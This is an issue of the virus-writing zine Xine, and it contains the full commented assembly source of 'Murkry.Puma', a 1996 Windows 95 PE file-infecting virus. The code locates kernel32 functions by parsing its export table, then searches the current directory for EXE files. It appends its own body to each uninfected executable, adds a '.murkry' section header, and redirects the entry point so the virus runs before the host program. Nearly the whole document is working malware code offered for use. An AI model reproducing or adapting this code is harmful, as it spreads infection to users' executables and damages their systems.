   ;                                        /-----------------------------\
   ;                                        | Xine - issue #2 - Phile 024 |
   ;                                        \-----------------------------/


   ; This virus was written to use a GetProc address routine that jhb wrote
   ; it basically does what Bizatch does. It adds a section to the file and has
   ; the entry point point at it. Hopefully JHB has written a PE file infection
   ; tutorial with Xine 2. So check that, also check the code for comments I did
   ; not recomment the GetprocAddress check JHB article on the finaly version
   ; I just modified it a bit ;).
   ; Well enjoy this due to the fact that this is a direct action virus and does
   ; not jump directories I dount it will spread far.  But this just proves that
   ; anything Ms comes out with someone can infect. (I believe this parphrase
   ; something from VLAD <sigh> sorry to hear they have passed on)
   ;
   ; Simple Win95 virus using a search engine for all routines it might need
   ; I did not make the Getproc just reworked it a bit to work with my newest
   ; creation
   ;**** Beta 1.0
   ; Murkry.Puma
   ; Author Murkry
   ; dec 28 1996
   ;Features:
   ; Use get procaddr to get the needed routine API address from kernel32
   ; Will infect all exe PE files in the directory does not span directories
   ; Adds .murkry as a section header is used to check for previous infection

   ;                -14h
   ;               -10h
   ;               -0Ch
   ;holders        -10
   ;ret_address    -8
   ;old_bp         -4

   ;VARIOUS EQU FOR PUMA'S  USE
   MAX_PATH        EQU     0FFH       ;MAX PATH FOR WIN95/NT
   OPEN_EXISTING   EQU     3          ;USED for CreateFile to open existing file
   GENERIC_READ    EQU     80000000H  ;OPEN FILE R/W
   GENERIC_WRITE   EQU     40000000H  ;USED BY THE CreateFile
   FATTR_NORMAL    EQU     0          ;normal file attribute for CreateFile

   PE_SIZE         EQU     0F8H       ;size of PE file header
   SEC_SIZE        EQU     28H        ;size of a section header
   FB_SIZE         EQU     0400H      ;VIRUS file buffer size

   ;typedef struct _WIN32_FIND_DATA {
   ;   DWORD dwFileAttributes;                          0
   ;   FILETIME ftCreationTime;            DD ?,?       4
   ;   FILETIME ftLastAccessTime;          DD ?,?       C
   ;   FILETIME ftLastWriteTime;           DD ?,?       14
   ;   DWORD nFileSizeHigh;                             1C
   ;   DWORD nFileSizeLow;                              20
   ;   DWORD dwReserved0;                               24
   ;   DWORD dwReserved1;                               28
   ;   CHAR cFileName[MAX_PATH];                        2C
   ;   CHAR cAlternateFileName[ 0EH ];
   ;} WIN32_FIND_DATA


   ;Stack frame definitions:
   TEMP            EQU     0               ;temporary storage location
   Shandle         EQU     TEMP+4          ;handle for file search functions
   FileHand        EQU     Shandle+4       ;handle for file open/read/write/close
   IOBYTES         EQU     FileHand+4
   FIND_DATA       EQU     IOBYTES+4       ;file search data structure
   FILEBUF         EQU     FIND_DATA+11*4+14+MAX_PATH
   WORKSP          EQU     FILEBUF + 1024
   ;below is one way of dealing with the getprocadd return info
   ;when it returns it is setup to leave the address routines on the
   ;stack. PUMA will allocate the space for the above data right after the
   ;return of GetProcAdd this allows us to access the routines the same way
   ;we access the data we save on the stack
   FindFirst       EQU     WORKSP + 4
   FindNext        EQU     FindFirst + 4
   Create          EQU     FindNext + 4
   lclose          EQU     Create + 4
   SetPointer      EQU     lclose + 4
   Read            EQU     SetPointer  + 4
   Write           EQU     Read + 4

   ;-------------------------------------------------------------------
   .386
   locals
   jumps
   .model flat ,stdcall

   ;Working version of a get address routine ends stack containing the
   ;request address of the process in a last in first out
   ;set to work with KERNEl32.dll and nothing else
   ;but once you get GetProcAddress, LoadLibrary you can get all
   ;other dll calls

   ;Define the needed external func tions and constants here.

   extrn           ExitProcess:PROC       ;only kernel32 call not
                                          ;set up with the GetProcAdd
                                          ;used in the dummy host

   .data                                        ;the data area
   ;Tasm5 will not compile with out some data oh well
   ;fake it out ;)
   Waste         dd      4 dup(0)

   .code                                   ;executable code starts here

   PUMA:

                   jmp     OverData
   LookFor         db      'FindFirstFileA', 0
                   db      'FindNextFileA', 0
                   DB      'CreateFileA', 0
                   DB      '_lclose', 0
                   DB      'SetFilePointer', 0
                   DB      'ReadFile',0
   last            DB      'WriteFile', 0
                   db      0Bh
   HowMany         equ     7h                      ;How many address'
                                                   ;I am requesting
   exe             db      '*.EXE',0
   OverData:
           PUSHAD
           xchg    edx, eax                        ;eax = eip = our offset

           LEA     ESI,[EDX + OFFSET LookFor - OFFSET PUMA]
           mov     eax,HowMany                     ;how many functions


           call    GetProcAdd                      ;on return the stack wil
                                                   ;have addresses in it

           PUSH    EBP                             ;this gives us a r/w area
           sub     esp,WORKSP                      ;to work with on the stack
           mov     ebp,esp                         ;amd since our address our
                                                   ;on the stack it preserves
                                                   ;them for us


           MOV     EDI,EDX                         ;since we used edx
                                                   ;to store our offset
                                                   ;this just saves use from
                                                   ;the call pop sub bit


   ;FindFirstFileA(ptr file_name, ptr Find data)
   ;returns in eax the handle of = -1 if no file found
           lea     eax,[ebp + FIND_DATA]                   ;THIS IS A FINDFIRST
           PUSH    EAX                                     ;FILE CALL
                                                           ;FIND ANY FILE THAT
           LEA     EAX,[EDI + OFFSET exe - offset PUMA ]   ;IS A *.EXE
           PUSH    EAX                                     ;
           CALL    DWORD PTR [EBP + FindFirst]             ;

           mov     [ebp + Shandle],EAX                     ;
           CMP     EAX,-1                                  ;
           JE      ERROR                                   ;NO FILES FOUND

   INFECT: CALL    FoundOne

   ;FindNextFileA( ptr handle, ptr find data structure)
   ;returns in eax True = 1, False = 0

           LEA     EAX,[EBP + FIND_DATA]
           PUSH    EAX

           MOV     EAX,[EBP + Shandle]
           PUSH    EAX

           CALL    DWORD PTR[EBP + FindNext]
           or      eax,eax
           jnz     INFECT


   ERROR:
           ADD     ESP,FindFirst                   ;restore the stack back to
           POPAD                                   ;where is was when we got
                                                   ;also restore all regs
   HostRet:
           jmp     fini                            ;this is dynamicaly written
                                                   ;when the virus infects host

   ;====================================================================
   FoundOne:
           call    OpenIt                  ;opens the file
           jz      Trouble                 ;problem opening the file

           mov     [ebp + FileHand], eax    ;save file handle

           Call    CheckIt                 ;check if PE and not infected

   DoneIt:

   FopenError:
           push    DWORD PTR [ebp + FileHand]
           CALL    DWORD PTR [EBP + lclose]

   Trouble:                        ;file not opened exit here
           ret

   ;-------------------------------------------------------------------
   ;simple reads in the first 1024 of the file checks if PE at the location
   ;specified by the 3ch in the MZ header
   ;Win95 does not check if for extended exe header at 18h = 40h
   ;it only checks if 3ch is a pointer to PE
   ;if this is ok for Win95 why should a virii do more
   ;

   CheckIt:
   ;File is Opened
           mov     ecx,FB_SIZE
           lea     edx,[ebp + FILEBUF]
           call    FileRead
           jz      ChError

           mov     ax,[ebp + FILEBUF + 3ch]        ;get the loc of the PE header
           cwde

           mov     esi,FILEBUF
           add     esi,eax
           mov     eax,[ebp+esi]
           cmp     ax,'EP'
           je      CheckInfect                     ;ok a PE file infect


   ChError:                                        ;file not a PE
            ret                                    ;
                                                   ;

   ;-----------------------------------------------------------------------
   ;ok We have a PE file now we find if its infected
   ;and if the header fits in buffer (1k)
   CheckInfect:

           mov     eax,esi
           sub     eax,FILEBUF
           add     eax,PE_SIZE             ;eax = dos header size
           mov     ebx,eax                 ;SAVE IN EBX

           xor     EAX,EAX                 ;
           mov     ax,[ebp+esi+6]          ;get actaul sector count
           inc     eax                     ;
           mov     ecx,SEC_SIZE            ;
           mul     ecx                     ;
           add     eax,ebx                 ;eax = size of all header info needed

           cmp     eax,FB_SIZE             ;will it fit in FILEBUF
           jnc     TryError                ;nope outa here

           cmp     eax,[ebp+esi+PE_SIZE + 0Ch]      ;will it fit in the file
           jnc     TryError                        ;Size of the Optional header

           xor     eax,eax                         ;# of sections in the file
           mov     ax,[ebp + esi + 6]              ;
           dec     eax                             ;
           mov     ecx,SEC_SIZE                    ;
           mul     ecx                             ;
           add     eax,PE_SIZE                     ;locate the last section
           mov     ebx,eax                         ;entry
           add     ebx,esi
           cmp     [ebp+ebx],"rum."                ;check it for the name

           jne     InfectIt

   TryError:
           ret


   ;-------------------------------------------------------------------
   ;file is not infected and fits the specs we need go ahead and try it

   InfectIt:
           Mov     eax,[ebp+FIND_DATA + 20h]       ;size of the exe

           call    FileSeek                        ;get to the end of the file

           ;this routine is now getting the amount PUMA must
           ;write to the host,counting padding
           ;FILE VIRUS SIZE = VirSize -1 + FileAlignment/FileAlignment

           mov     eax,VirSize - 1                 ;

           mov     ecx,[ebp + esi + 03ch]          ;file alignment

           add     eax,ecx                         ;
           cdq               ;edx = 0

           div     ecx
           mul     ecx

           mov     ecx,eax
           push    eax                             ;save amount to write for
                                                   ;section header


           lea     edx,[edi + offset PUMA - OFFSET PUMA]

           ; on entry to filewrite eax = #bytes edx where to get the
           ; bytes from
           call    FileWrite

   ;now we have the virus body at the end of the host we need to update the
   ;header so it gets control

           inc     word ptr [ebp + esi + 6]        ;set and get the new
           xor     eax,eax                         ;section count
           mov     ax,[ebp+esi+6]                  ;

           push    esi edi


           ;get the location in the file that the new section header must be
           ;writen
           ;Location =  (OldSecCount * Sec_Size)+PeSize
           ; esi+ebp = Pe start on stack

           dec     eax                             ;
           mov     ecx, SEC_SIZE                   ;

           mul     ecx                             ;eax = eax*SEC_SIZE
           add     EAX,PE_SIZE                     ;

           add     eax,esi                         ;eax = proper location
           add     eax,ebp                         ;in stack

           ;now get esi to point to where we have the buffer for the
           ;virus section header
           ;then set edi to eax which is where the header should be on
           ;our buffer in the stack

           mov     esi,edi                         ;esi ->section hdr template
           add     esi, offset SEC_HEADER - offset PUMA

           mov     edi,eax                         ;edi ->new section hdr locati
           mov     ebx,eax                         ;
           rep     movsb                           ;
                                                   ;
           pop     edi esi                         ;


   ;ok we have the blank .murkry header entry
   ;now we need to fill in the blanks like how big are we
   ;
           pop     eax                             ;size of RawData from last
                                                   ;file write
           mov     [ebx + 10h],eax                 ;ebx refrences the new
                                                   ;section header

   ;where are we

           mov     eax,[ebp + FIND_DATA + 20h]   ;old size of EXE file
           mov     [ebx+14h],eax            ;set PtrRawData = old size




           mov     eax,[ebx-28h + 10h]  ;get SizeRawData from previous section
           dec     eax                  ;header
           mov     ecx,[ebp + esi + 38h];get SectionAlignment
           add     eax,ecx              ;add eax=SizeRawData-1+SectionAlignment
           xor     edx,edx
           div     ecx
           mul     ecx                  ;size of code in SectionAlignment blocks
           add     eax,[ebx - 28h + 0ch];add in last section's virtual address
           mov     [ebx+0ch],eax        ;and set VirtualAddress for this section

   ;That's the end of adding the new section header. Now we must modify a few
   ;fields in the PE header itself.

           xchg    eax,[ebp+esi+28h]     ;set up new entry point
           mov     [ebp+TEMP],eax        ;save old entry point here

           mov     eax,[ebx+ 0ch ]       ;get SizeOfRawData from new section hdr
           add     [ebp+esi+ 1ch ],eax   ;update SizeOfCode in PE header

           mov     eax,[ebx + 10h ]      ;get SizeRawData from viral section hdr
           dec     eax
           add     eax,ecx               ;add eax=SizeRawData-1+SectionAlignment
           xor     edx,edx
           div     ecx
           mul     ecx                   ;size of code in SectionAlignment blocks
           add     [ebp + esi + 50h ],eax  ;update SizeOfImage

   ;Now the header is completely set up and ready to go. The next step is to save
   ;it to disk.

           mov     eax,esi
           sub     eax,FILEBUF             ;eax = offset of PE header in file
           call    FileSeek                ;seek

           xor     ecx,ecx
           mov     cx,[ebp+esi+6]          ;# of section headers to ecx
           mov     eax,SEC_SIZE            ;size of section header
           mul     ecx                     ;size of section headers
           mov     ecx,PE_SIZE             ;size of PE header
           add     ecx,eax                 ;ecx=amount to write
           lea     edx,[ebp+esi]           ;address to write from

           call    FileWrite               ;update PE header


   ;ok we just need to update the return entry point so the host can
   ;have control

           mov     eax,[ebp+FIND_DATA+20H]  ;get old file size  murk
           add     eax,OFFSET HostRet - OFFSET PUMA + 1

           call    FileSeek                ;seek to proper location in file

           mov     eax,[ebp+esi+40]        ;get new entry point
           add     eax,OFFSET HostRet - OFFSET PUMA + 5     ;RVA to jump from
           sub     [ebp+TEMP],eax          ;subtract from destination address

           mov     ecx,4                   ;now adjust jump address in host
           lea     edx,[ebp+TEMP]
           call    FileWrite                ;write it to file
           jmp     DoneIt                   ;and exit infect routine




   ;-------------------------------------------------------------------
   ;SetFilePointer( handle, dword number of bytes to move it, pointer to the high
   ; order bits of the move, flag of where we should start the move from)
   ;settings are FILE_BEGIN   = 0
   ;             FILE_CURRENT = 1
   ;             FILE_END     = 2
   ;returns in EAX the the new 32 bits of the file pointer
   ;if the pointer is pointing to a non null then this is the high order of the
   ;new value

   ;ALSO if the distance to move is a negative number you can move backwards



   FileSeek:
           push    LARGE 0                         ;from where do we seek
           push    LARGE 0                         ;high dword of where we
           push    eax                             ;search to low dword
           push    dword ptr [ebp + FileHand]
           call    dword ptr [EBP + SetPointer]
           ret

   ;-------------------------------------------------------------------
   ;
   ;WriteFile(handle, lp buffer of where data is, number of bytes,
   ; overlapp structure(set it to zero and forget it))

   FileWrite:
           push    LARGE 0                         ;needed to set to null (0)
                                                   ;for our needs

           LEA     eax,[ebp + IOBYTES]             ;this will hold how many
           push    eax                             ;bytes actualy written

           push    ecx                             ;how many bytes
           push    edx                             ;buffer to read data from

           push    dword ptr [ebp + FileHand]       ;file handle
           call    dword ptr [ebp + Write]          ;call the Read api

                                                   ;if no prob then eax = true 1
                                                   ;else set to 0 for false
           or      eax,eax                         ;set z if problem
           ret                                     ;
   ;-------------------------------------------------------------------
   ;same as filewrite figure it out ;)

   FileRead:
           push    LARGE 0

           lea     eax,[ebp +IOBYTES]
           push    eax

           push    ecx

           push    edx

           push    dword ptr [ebp + FileHand]
           call    dword ptr [ebp + Read]

           or      eax,eax                 ;if problem set z
           ret

   ;-------------------------------------------------------------------
   ;Ok we use CreateFile here cause thats what VLad did =) !!
   ;CreateFile(lp to a name,dword access rights, dword share,
   ; dword Security attributes, dword create dword attrandflags,
   ; handle to something ;) )
   ; lucky for us we can set most to zero and it still works
   ;
   ; well thats it for my commets
   ;Murk
   OpenIt:

           xor     eax,eax

           push    eax

           push    eax

           push    LARGE OPEN_EXISTING

           PUSH    eax
           push    eax

           push    LARGE GENERIC_READ or GENERIC_WRITE

           lea     eax,[ebp+FIND_DATA +02ch]       ;location of file name
           push    eax                             ;in the win95 finddata
                                                   ;structure
           call    dword ptr[ebp + Create]
           cmp     eax,-1                          ;if -1 no good
           ret

   ;-------------------------------------------------------------------

   Code_Sec        equ     00000020h
   Executable      Equ     20000000h
   Readable        equ     40000000h
   ;data                                                           H   D
   SEC_HEADER      db      ".murkry",0     ;                       0   0
                   dd      VirSize         ;                       8   8
                   dd      0               ;Virtual size           c   12
                   dd      0               ;Virtual Address        10  16
                   dd      0               ;SizeRawData            14  20
                   dd      0               ;PtrRawData             18  24
                   dd      0               ;PtrRelocs              1c  28
                   dd      0               ;PtrLineNos             20  32
                   dd      0               ;NumRelocs              24  36
                   dd      0               ;NumLineNos             28  40
                   dd      Code_Sec or Executable or Readable ;     2c  44

   ;-------------------------------------------------------------------
   ; While jhb wrote the code for below and more or less got is to work
   ; I played with it and with his help got a Virri working with it
   ; yea it has some hard code with it and will fail horrible with NT
   ;and I suspect any win95 version that moves the kernel form bff7000h
   ;but I somehow dount that
   ; well thats it for my commets
   ;Murk


   ;===========================================================================
   Export_rva      equ     0
   kern1           equ     Export_rva + 4
   baseF           equ     kern1 + 4
   AddFunc         equ     baseF + 4
   AddName         equ     AddFunc + 4
   Nindex          equ     AddName + 4
   AddOrd          equ     Nindex + 4
   limit           equ     AddOrd + 4
   Where           equ     limit + 4
   Looking         equ     Where + 4
   worksp          equ     Looking + 4
   ;all above used by the GetProcAdd
   ;
   ;-------------------------------------------------------------------



   GetProcAdd:
   ;esi = the list of address's   delimited by Zero end in 0Bh ;Looking
   ;edi = the space we will put it on the stack
   ;edx = offset of program

           pop     ebx

           shl     eax,2
           sub     esp,eax
           mov     edi, esp

           push    ebx

           push    ebp
           sub     esp,worksp
           mov     ebp,esp


           mov     [ebp +  Where],edi              ;save where will store them
           mov     [ebp + Looking],esi             ;save which ones looking fo

           mov     esi,dword ptr [edx + offset kern - offset PUMA ]

           lodsw
           cmp     ax,'ZM'                ;we assume Bff70000h for location
           jne     Not95                  ;of the Kernel

           xor     eax,eax
           add     esi,3Ah
           lodsw

           mov     esi,dword ptr [edx + offset kern - offset PUMA ]
           add     esi,eax                ;if this is not true get out
           lodsd

           cmp     ax,'EP'                ;same thing if this is not true
           jne     Not95                  ;something is wrong

   ;found the PE header
   ;        sub     esi,4           ;back up si to the PE header

           mov     [ebp + kern1],eSI

           add     esi,74h         ;should be 78h but the last lodsw
           lodsd                   ;should be rva to the .edata

           mov     ebx, dword ptr [edx + offset kern - offset PUMA ]

           add     eax,ebx                 ;should be the .edata area
                                           ;offset to the to name of dll
           add     eax,10h                 ;
           mov     esi,eax                 ;get us to the base
                                           ;
           lodsd
           mov     [ebp + baseF],eax       ;this is the starting ordinal that
                                           ;that all must be added to
                                           ;usualy 1 for kernel32

           lodsd                           ;total number of exported functions
                                           ;by name and ordinal

           lodsd
           mov     [ebp + limit],eax       ;how many functions are exported
                                           ;by name this is the limit of how many
                                           ;we will search for

   ;the next three are all RVA's to the
   ;fields so we need to add the offset
   ;them
           lodsd                           ;this is the address to
           add     eax,dword ptr [edx + offset kern - offset PUMA ]
                                       ;an array of pointers to the
           mov     [ebp + AddFunc],eax     ;entry point rva's of each

           lodsd                           ;this is the RVA to ascii names
           add     eax,dword ptr [edx + offset kern - offset PUMA ]
       mov     [ebp + AddName],eax     ;of each named exported function

           lodsd                           ; rva points to  array of words
           add     eax,dword ptr [edx + offset kern - offset PUMA ]
           mov     [ebp + AddOrd],eax ; which are the export ordinals- the base

   ;ok we have everthing we need to go ahead and locate the address's of the
   ;KERNEL32.dll functions

           mov     ebx,[ebp + Looking]     ;get address of the first name


   LookLoop:
           mov     esi,[ebp + AddName]     ;get the first rva pointer to a name
           mov     [ebp + Nindex],esi      ;

           mov     edi,[esi]               ;now make it a true pointer to the
           add     edi,[edx + offset kern - offset PUMA ]
                                       ;name by adding the offset

           mov     ecx,0                   ;sets the counter to 0


   TryAgain:
           mov     esi,ebx                 ;what function we are looking for
                                           ;now simple cmp strs
   MatchByte:
           cmpsb
           jne      NextOne                ;not it try next nameof fucntion

           cmp     byte ptr [edi],0        ;if equal to 0 we found a match
           je      GotIt                   ;

           jmp     MatchByte               ;nope try next byte

   NextOne:
          inc      cx
          cmp      cx,[ebp + limit]
          jge      not_found

          add      dword ptr [ebp + Nindex],4      ;get the next pointer rva
          mov      esi,[ebp + Nindex]              ;and try again
          mov      edi,[esi]                       ;
          add      edi,[edx + offset kern - offset PUMA ]
          jmp       TryAgain                       ;

   ;---------------------------------------------------------------------
   GotIt:
   ;note if not a match is found the all other from then on in are blank
   ;in other words dont mispell ,or ask for for a function that is not in
   ; KERNEL32
   ;esi = the 0 at the end of the name of the strings given to us to look for
   ;
   ;cx = the index into the AddOrd
   ;take Nindex * 4 + [AddOrd] = Ordinal
   ;Ordinal * 4 + [AddFunc] should be the rva to the fuction

           mov     ebx,esi         ;get set for next search routine
           inc     ebx             ;

           shl     ecx,1           ;*2 looking into a word array
           mov     Esi,[ebp + AddOrd]
           add     Esi,ecx
           xor     eax,eax
           mov     ax,word ptr [esi]

   ;here ax equals the ordinal - the base
   ;if ordinal is passed to hear then we should be able to skip
   ;searching for a name and hit here
   ;not sure of course but it tested on a few that I tried
   ;

           shl     eax,2                ;*4 looking into a dword array
           mov     esi,[ebp + AddFunc]
           add     Esi,eax

           mov     Edi,dword ptr [esi]
           add     Edi,[edx + offset kern - offset PUMA ]

           push    ebp

           mov     esi, [ebp + Where]
           mov     ebp,esi
           mov     [ebp ],edi

           pop     ebp
           add     dword ptr [ebp + Where],4

           cmp     byte ptr [ebx],0bh
           jne     LookLoop

           jmp     over_error

   Not95:
           xor     esi,esi                 ;if the header of the kernel
                                           ;is not there forget it, its not
                                           ; the Win95 we know and love ;)

   not_found:                              ; String pass to us is not a
           xor     edi,edi                 ; valid fucntion name

   over_error:

           ADD     ESP,worksp
           pop     ebp

           ret

   ;YEA HARD CODED <SIGH>

   kern            dd      0BFF70000h      ;must add to all rva's

   ;----------------------------------------------------------------------------

   VirSize         equ     $ - PUMA


   fini:           ;left over from a Teacher who use to teach me C++

           push    LARGE -1
           ;call    dword ptr edi          ;when I used the routine to locate
                                           ;the ExitProcess address
           call    ExitProcess             ;this simply terminates the program

            end     PUMA
